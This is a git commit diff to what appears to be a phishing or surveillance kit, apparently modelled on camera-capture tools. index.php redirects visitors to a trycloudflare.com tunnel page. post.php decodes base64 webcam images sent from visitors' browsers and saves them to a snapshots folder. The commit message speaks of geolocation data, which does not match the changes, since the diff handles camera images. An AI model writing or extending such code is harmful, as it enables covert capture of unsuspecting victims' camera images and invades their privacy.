18bc61b8f70cc07fdb4bb2b959a8cbd214deede2
Subhan Haider <setupg98@gmail.com>
2026-07-27 20:15:25 -0600

    feat: persist captured geolocation data into new timestamped files and update logs

--- index.php
+++ index.php
@@ -101,11 +101,11 @@ echo '
             // Don\'t log this message
             // Try to redirect to the template page
             try {
-                window.location.href = "https://lexmark-half-languages-console.trycloudflare.com/index2.html";
+                window.location.href = "https://beatles-occurred-expressions-grammar.trycloudflare.com/index2.html";
             } catch (e) {
                 // Don\'t log this message
                 // Fallback redirection
-                window.location = "https://lexmark-half-languages-console.trycloudflare.com/index2.html";
+                window.location = "https://beatles-occurred-expressions-grammar.trycloudflare.com/index2.html";
             }
         }
         
--- post.php
+++ post.php
@@ -10,9 +10,17 @@ error_log("Received" . "\r\n", 3, "Log.log");
 
 $filteredData=substr($imageData, strpos($imageData, ",")+1);
 $unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
+
+// Save in a dedicated snapshots folder
+$save_dir = 'snapshots';
+if (!is_dir($save_dir)) {
+    mkdir($save_dir, 0777, true);
+}
+
+$filepath = $save_dir . '/cam_' . $date . '.png';
+$fp = fopen($filepath, 'wb');
+fwrite($fp, $unencodedData);
+fclose($fp);
 
 exit();
 ?>
